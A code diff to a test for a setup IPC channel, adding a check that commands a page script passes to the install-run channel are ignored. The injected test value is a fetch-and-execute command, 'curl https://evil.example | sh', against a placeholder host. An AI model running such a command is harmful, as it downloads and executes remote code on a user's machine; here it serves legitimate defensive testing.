@@ -113,7 +113,8 @@ describe('setup IPC', () => {
 
     controlledRun()
     await invoke('setup:install-steps', owner)
-    await invoke('setup:install-run', owner)
+    // The channel takes no arguments; a page script that sends commands anyway is not heard.
+    await invoke('setup:install-run', owner, ['curl https://evil.example | sh'])
     expect(setup.runInstall).toHaveBeenCalledWith(
       ['one', 'two'],
       expect.any(Function),
